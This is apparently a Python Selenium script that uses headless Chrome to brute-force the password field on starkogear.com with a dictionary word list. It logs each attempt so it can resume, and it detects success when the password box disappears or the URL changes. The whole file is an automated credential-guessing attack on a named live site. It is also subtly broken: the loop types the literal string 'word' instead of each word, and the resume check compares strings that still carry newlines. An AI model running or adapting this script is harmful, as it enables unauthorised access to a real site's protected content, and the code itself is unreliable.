from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import time as t

answer = ""
speed = .26
previous_attempts = set()
new_attempts = set()

# update the set of previous attempts
print("------------------------\nReading in previous attempts")
with open('attempted_words.txt', 'r') as prev_attempts_file:
    previous_attempts.update(prev_attempts_file.read().splitlines())
print("Complete\n------------------------")

words = []
# get the remaining untested words from the file (picking up where we left off)
with open("words_alpha.txt", "r") as dictionary_file:
    for line in dictionary_file.readlines():
        stripped_line = line.strip()
        if 4 < len(stripped_line) < 10:
            if line not in previous_attempts:
                words.append(line.strip())
print(f'Words left to search->{len(words)}\n------------------------')

# modification to browser
chrome_options = Options()
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--disable-extensions")
chrome_options.add_argument("--headless")
chrome_options.add_argument("--window-size=960,1080")

# Initialize the webdriver, options, and get the password field and error message box
driver = webdriver.Chrome(chrome_options=chrome_options)
driver.get("https://www.starkogear.com")
input_field = driver.find_element(By.CLASS_NAME, "password-input")
error_message = driver.find_element(By.CLASS_NAME, "error-message")
t.sleep(2)

print("Testing Input Box")
# initial run to generate the error message on the page source
input_field.send_keys("test")
input_field.send_keys(Keys.RETURN)
t.sleep(2)
old_page_source = driver.page_source
print("Test Complete\n------------------------")
t.sleep(1)

print("Begin")
with open('attempted_words.txt', 'a') as prev_attempts_file:
    for word in words:
        input_field.clear()
        input_field.send_keys("word")
        input_field.send_keys(Keys.RETURN)
        t.sleep(speed)

        # if the password box still exists
        if len(driver.find_elements(By.CLASS_NAME, "password-input")) == 0:
            answer = word
            print("Password box element no longer found")
            t.sleep(2)
            break

        # if the url of the page changes
        elif driver.current_url != "https://starkogear.com/":
            answer = word
            print(f'URL CHANGED: {driver.current_url}')
            t.sleep(2)
            break

        prev_attempts_file.write(word + "\n")
        new_attempts.add(word)
        old_page_source = driver.page_source

print(f"FINISHED\nANSWER: {answer}"
      f"\nNew Attempts {len(new_attempts)}"
      f"\nTotal Attempts {len(previous_attempts) + len(new_attempts)}\n------------------------")

t.sleep(120)
# driver.quit()
